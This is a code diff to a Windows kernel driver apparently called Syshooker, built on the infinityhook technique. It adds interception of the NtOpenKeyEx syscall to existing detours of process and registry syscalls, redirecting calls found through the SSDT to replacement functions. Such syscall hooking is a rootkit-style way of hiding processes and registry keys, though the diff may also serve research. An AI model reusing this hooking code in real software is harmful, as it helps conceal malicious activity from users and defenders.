@@ -37,6 +37,7 @@ SyshookerSettings Settings = {
 #include "NtOpenProcess.h"
 #include "NtQuerySystemInformation.h"
 #include "NtOpenKey.h"
+#include "NtOpenKeyEx.h"
 #include "NtQueryKey.h"
 #include "NtEnumerateKey.h"
 
@@ -167,12 +168,21 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	}
 	else kprintf("[+] infinityhook: NtQueryKey address: %p.\n", OriginalNtQueryKey);
 
+	// NtEnumerateKey
 	OriginalNtEnumerateKey = (NtEnumerateKey_t)GetSyscallAddress(INDEX_NTENUMERATEKEY, (PCHAR)SsdtAddress);
 	if (!OriginalNtEnumerateKey) {
 		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtEnumerateKey);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 	else kprintf("[+] infinityhook: NtEnumerateKey address: %p.\n", OriginalNtEnumerateKey);
+
+	// NtOpenKeyEx
+	OriginalNtOpenKeyEx = (NtOpenKeyEx_t)GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
+	if (!OriginalNtOpenKeyEx) {
+		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtOpenKeyEx);
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+	else kprintf("[+] infinityhook: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);
 
 	// Try to find addresses of the registry-related syscalls
 	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
@@ -306,6 +316,12 @@ void __fastcall SyscallCallback(
 	if (*SystemCallFunction == OriginalNtEnumerateKey)
 	{
 		*SystemCallFunction = DetourNtEnumerateKey;
+	}
+
+	//NtOpenKeyEx
+	if (*SystemCallFunction == OriginalNtOpenKeyEx)
+	{
+		*SystemCallFunction = DetourNtOpenKeyEx;
 	}
 }
 
